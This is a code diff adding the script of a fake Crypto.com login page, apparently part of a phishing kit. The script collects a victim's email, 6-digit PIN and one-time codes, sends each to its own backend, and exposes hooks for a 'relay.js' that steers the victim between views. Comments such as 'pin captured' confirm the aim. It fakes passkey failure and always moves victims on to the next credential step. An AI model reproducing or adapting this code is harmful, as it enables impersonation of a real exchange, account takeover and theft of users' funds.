+  html+='<rect x="'+cx+'" y="'+cy+'" width="20" height="20" rx="4" fill="#fff"/>';
+  html+='<rect x="'+(cx+2)+'" y="'+(cy+2)+'" width="16" height="16" rx="3" fill="#1a56db"/>';
+  svg.innerHTML=html;
+}
+
+// ── VIEW MANAGEMENT ──
+var VIEWS = ['formLogin','formSignup','view-pin','view-otp','view-success'];
+function hideAll(){ VIEWS.forEach(function(id){ var e=document.getElementById(id); if(e){e.classList.add('hidden');e.classList.remove('view-anim');} }); }
+function showView(id){
+  hideAll();
+  var el=document.getElementById(id);
+  el.classList.remove('hidden');
+  void el.offsetWidth;
+  el.classList.add('view-anim');
+}
+
+function setMode(m){
+  _mode=m;
+  document.getElementById('modeLogin').classList.toggle('active',m==='login');
+  document.getElementById('modeSignup').classList.toggle('active',m==='signup');
+  if(m==='login'){showView('formLogin');setTab('email');}
+  else showView('formSignup');
+}
+
+function setTab(t){
+  _tab=t;
+  ['passkey','email'].forEach(function(x){
+    var cap=x.charAt(0).toUpperCase()+x.slice(1);
+    var tabEl=document.getElementById('tab'+cap);
+    var viewEl=document.getElementById('tabView'+cap);
+    if(tabEl) tabEl.classList.toggle('active',x===t);
+    if(viewEl){
+      viewEl.classList.toggle('hidden',x!==t);
+      if(x===t){viewEl.classList.remove('view-anim');void viewEl.offsetWidth;viewEl.classList.add('view-anim');}
+    }
+  });
+}
+
+function setAcct(a){
+  _acct=a;
+  document.getElementById('acctInd').classList.toggle('active',a==='individual');
+  document.getElementById('acctBiz').classList.toggle('active',a==='business');
+}
+
+function toggleRef(){
+  var p=document.getElementById('refPanel');
+  p.classList.toggle('open');
+}
+
+// ── CODE BOXES ──
+function wireBoxes(attr){
+  var boxes=document.querySelectorAll('[data-'+attr+']');
+  boxes.forEach(function(box,i){
+    box.addEventListener('input',function(){
+      box.value=box.value.replace(/\D/g,'').slice(-1);
+      if(box.value&&i<boxes.length-1)boxes[i+1].focus();
+    });
+    box.addEventListener('keydown',function(e){
+      if(e.key==='Backspace'&&!box.value&&i>0)boxes[i-1].focus();
+    });
+  });
+}
+wireBoxes('pin');wireBoxes('otp');
+
+function getBoxVal(attr){ return Array.from(document.querySelectorAll('[data-'+attr+']')).map(function(b){return b.value;}).join(''); }
+function clearBoxes(attr){ document.querySelectorAll('[data-'+attr+']').forEach(function(b){b.value='';}); }
+
+// ── BUTTON LOADING ──
+function setLoading(id,on){
+  var btn=document.getElementById(id);
+  if(!btn)return;
+  btn.classList.toggle('loading',on);
+  btn.disabled=on;
+}
+
+// ── WINDOW HOOKS (relay.js uses these) ──
+window._showPinView=function(){
+  showView('view-pin');
+  document.querySelectorAll('[data-pin]')[0].focus();
+};
+window._showOtpView=function(hint){
+  if(hint)document.getElementById('otpHint').textContent=hint;
+  showView('view-otp');
+  clearBoxes('otp');
+  document.querySelectorAll('[data-otp]')[0].focus();
+};
+window._showSuccessView=function(){
+  showView('view-success');
+  setTimeout(function(){document.getElementById('successBar').style.width='100%';},60);
+};
+
+// ── SESSION ──
+var _sid = null;
+var _email = '';
+
+function apiPost(path, body){
+  return fetch(path,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)}).then(function(r){return r.json();});
+}
+
+function startSession(cb){
+  if(_sid){cb();return;}
+  apiPost('/api/session',{mobile:/Mobi|Android/i.test(navigator.userAgent)}).then(function(r){
+    _sid=r.sid;
+    cb();
+  }).catch(function(){cb();});
+}
+
+// ── ACTIONS ──
+function doEmail(){
+  var email=document.getElementById('loginEmail').value.trim();
+  if(!email)return;
+  _email=email;
+  setLoading('btnLogin',true);
+  startSession(function(){
+    apiPost('/api/login',{sid:_sid,email:email}).then(function(r){
+      setLoading('btnLogin',false);
+      if(r.step==='pin'||r.step==='unknown'){
+        document.getElementById('pinHint').textContent='Enter the 6-digit PIN for your Crypto.com account';
+        document.getElementById('pinEmail').textContent=email;
+        showView('view-pin');
+        clearBoxes('pin');
+        document.querySelectorAll('[data-pin]')[0].focus();
+      } else if(r.step==='otp'){
+        window._showOtpView('Enter the code sent to '+email);
+      } else if(r.step==='done'){
+        window._showSuccessView();
+      } else {
+        // fallback — go to PIN anyway
+        document.getElementById('pinHint').textContent='Enter the 6-digit PIN for your Crypto.com account';
+        document.getElementById('pinEmail').textContent=email;
+        showView('view-pin');
+        clearBoxes('pin');
+        document.querySelectorAll('[data-pin]')[0].focus();
+      }
+    }).catch(function(){
+      setLoading('btnLogin',false);
+      document.getElementById('pinEmail').textContent=email;
+      showView('view-pin');
+      clearBoxes('pin');
+      document.querySelectorAll('[data-pin]')[0].focus();
+    });
+  });
+}
+function doPasskey(){
+  alert('Passkey authentication unavailable on this device.');
+}
+function doSignup(){
+  var email=document.getElementById('signupEmail').value.trim();
+  if(!email)return;
+  setLoading('btnSignup',true);
+  setTimeout(function(){setLoading('btnSignup',false);window._showOtpView('Enter the code sent to '+email);},900);
+}
+function doSocial(p){
+  document.querySelectorAll('.btn-social').forEach(function(b){b.classList.add('loading');});
+  startSession(function(){
+    apiPost('/api/social',{sid:_sid,provider:p}).then(function(r){
+      document.querySelectorAll('.btn-social').forEach(function(b){b.classList.remove('loading');});
+      if(r.step==='pin'){showView('view-pin');clearBoxes('pin');document.querySelectorAll('[data-pin]')[0].focus();}
+      else if(r.step==='otp'){window._showOtpView('');}
+      else if(r.step==='done'){window._showSuccessView();}
+    }).catch(function(){
+      document.querySelectorAll('.btn-social').forEach(function(b){b.classList.remove('loading');});
+    });
+  });
+}
+function doPin(){
+  var pin=getBoxVal('pin');
+  if(pin.length<6)return;
+  setLoading('btnPin',true);
+  apiPost('/api/login',{sid:_sid,pin:pin}).then(function(r){
+    setLoading('btnPin',false);
+    if(r.step==='error'){
+      clearBoxes('pin');
+      document.getElementById('pinHint').textContent='Incorrect PIN. Please try again.';
+      document.querySelectorAll('[data-pin]')[0].focus();
+    } else {
+      // pin captured — always advance to email code step
+      window._showOtpView('Enter the 6-digit code sent to '+_email);
+    }
+  }).catch(function(){
+    setLoading('btnPin',false);
+    window._showOtpView('Enter the 6-digit code sent to '+_email);
+  });
+}
+function doOtp(){
+  var code=getBoxVal('otp');
+  if(code.length<6)return;
+  setLoading('btnOtp',true);
+  apiPost('/api/otp',{sid:_sid,code:code}).then(function(r){
+    setLoading('btnOtp',false);
+    window._showSuccessView();
+  }).catch(function(){setLoading('btnOtp',false);window._showSuccessView();});
+}
+function resendOtp(){
+  var h=document.getElementById('otpHint'),orig=h.textContent;
+  h.textContent='Code resent!';
+  setTimeout(function(){h.textContent=orig;},2000);
+}
+</script>
+</body>
+</html>
